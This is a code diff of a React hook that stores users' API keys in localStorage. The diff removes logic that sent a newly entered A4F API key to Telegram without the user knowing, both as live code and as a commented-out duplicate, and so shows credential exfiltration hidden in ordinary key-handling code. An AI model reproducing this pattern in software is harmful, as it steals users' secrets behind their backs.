@@ -1,8 +1,6 @@
-
 // hooks/use-api-keys.tsx
 import { useLocalStorage } from './use-local-storage';
 import { useState, useEffect } from 'react';
-import { sendNewA4fKeyToTelegram } from '@/app/actions'; // Updated import path
 
 // Storage keys for different API keys
 export const A4F_API_KEY_STORAGE_KEY = 'a4f-api-key';
@@ -81,12 +79,6 @@ export function useApiKeys(): {
     if (type === 'a4f') {
       if (valueToStore === null) localStorage.removeItem(A4F_API_KEY_STORAGE_KEY);
       setA4fKey(valueToStore);
-      if (wasKeyNullOrEmpty && valueToStore) {
-        console.log("Attempting to send new A4F API key to Telegram.");
-        sendNewA4fKeyToTelegram(valueToStore).catch(error => {
-          console.error("Failed to send API key to Telegram:", error);
-        });
-      }
     } else if (type === 'tavily') {
       if (valueToStore === null) localStorage.removeItem(TAVILY_API_KEY_STORAGE_KEY);
       setTavilyKey(valueToStore);
@@ -115,21 +107,12 @@ export function useApiKey(): [string | null, (key: string | null) => void, boole
   }, []);
 
   const setSingleA4fApiKey = (key: string | null) => {
-    const wasKeyNullOrEmpty = allApiKeys.a4f.key === null || allApiKeys.a4f.key === '';
     const trimmedKey = key ? key.trim() : null;
     setStoredKey(trimmedKey); // This is for the simple input
 
     // Also update the main a4f key in the multi-key system
     // Use the setApiKey from useApiKeys to ensure consistency
     setMultiApiKey('a4f', trimmedKey);
-     
-    // The logic to send to telegram is now handled within the setApiKey of useApiKeys
-    // if (wasKeyNullOrEmpty && trimmedKey) {
-    //     console.log("Attempting to send new A4F API key to Telegram from simple input.");
-    //     sendNewA4fKeyToTelegram(trimmedKey).catch(error => {
-    //       console.error("Failed to send API key to Telegram from simple input:", error);
-    //     });
-    // }
   };
 
   return [isKeyLoaded ? storedKey : null, setSingleA4fApiKey, isKeyLoaded];
